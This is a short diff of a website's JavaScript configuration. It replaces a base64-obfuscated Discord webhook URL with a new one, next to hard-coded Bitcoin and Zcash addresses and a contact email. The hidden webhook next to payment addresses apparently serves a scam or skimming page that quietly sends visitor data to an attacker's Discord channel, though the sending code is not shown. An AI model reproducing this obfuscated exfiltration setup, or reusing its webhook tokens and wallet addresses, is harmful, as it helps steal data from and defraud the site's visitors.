@@ -119,7 +119,7 @@ document.addEventListener("DOMContentLoaded", () => {
 /* ── ANCIEN SITE LOGIC ── */
 
 /* ── CONFIG ── */
-const WH = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NTU2ODA5OTI3NjIyNjU3MC9VcVNkRmJVbXEwUUtHN3o3V24xNFd3VmVOOXl3akptLThOcU9wdnJRb0hNeFNvSlEtLV9wa0tEX0liUmRYcFpudER3dQ==");
+const WH = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMTQ0ODM1ODUyOTQwMDk1Mi80ZGU0cWxpbmEwRnN4Um9sYW5qTW52S0xTX2ZVNXBJWFhSV2xqQTM3WWVtZVFTMGIwVEJwRUtBLUVwUnhtd29LOU5nZA==");
 const BTC = "bc1qg5u6nq8hwgkseychphcw5652le6gvz930pxuh2";
 const ZEC = "u1c9h9cswer89qaqwtlw6js86mec79lva6yszg0yfs006nd5l7phfk2q5lu9eg62cz78kt0d8nz5azvmvrrqndstncv54p5fegh8mk6nc2jn68l4keu40k5n8yxyyrgpzn7qd4ttum20la2n2nqhv02dtrjj5ux5w54pk257nmh8zuh0yxsfkq806eeaqudee74gae84j8fm8y7gtdfjw";
 const INT = "ghostlimon2@outlook.com";
